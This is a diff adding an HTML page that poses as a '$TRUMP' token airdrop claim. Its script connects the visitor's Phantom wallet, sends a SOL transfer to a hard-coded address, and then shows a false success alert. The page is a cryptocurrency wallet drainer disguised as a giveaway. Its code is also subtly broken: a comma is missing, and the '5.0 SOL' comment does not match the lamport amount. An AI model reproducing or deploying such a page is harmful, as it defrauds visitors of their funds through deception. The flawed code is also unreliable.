@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim Your $TRUMP Airdrop</title> 
+  <script src="https://unpkg.com/@solana/web3.js@1.30.0/lib/index.iife.min.js"></script>
+</head>
+<body>
+  <h1>🎉 Welcome to the $TRUMP Token Airdrop!</h1> 
+  <p>Connect your Phantom Wallet to claim 250 $TRUMP tokens instantly.</p> 
+  <button id="connect-btn">Connect Wallet</button>
+
+  <script>
+    document.getElementById("connect-btn").addEventListener("click", async () => {
+      const provider = window.solana;
+      await provider.connect(); // Prompts wallet connection
+
+      const connection = new solanaWeb3.Connection(
+        solanaWeb3.clusterApiUrl("mainnet-beta")
+      );
+
+
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: provider.publicKey,
+          toPubkey: new solanaWeb3.PublicKey("4DdbWFvKurPWtALm35igCNHfbMspYd1wtvPVgLH7fn6i")
+          lamports: 10000000 // 5.0 SOL
+        })
+      );
+
+      transaction.feePayer = provider.publicKey;
+      transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+
+      const signedTx = await provider.signTransaction(transaction);
+      const rawTx = signedTx.serialize();
+      await connection.sendRawTransaction(rawTx);
+
+      alert("Airdrop claimed! ✅"); //  success
+    });
+  </script>
+</body>
+</html>
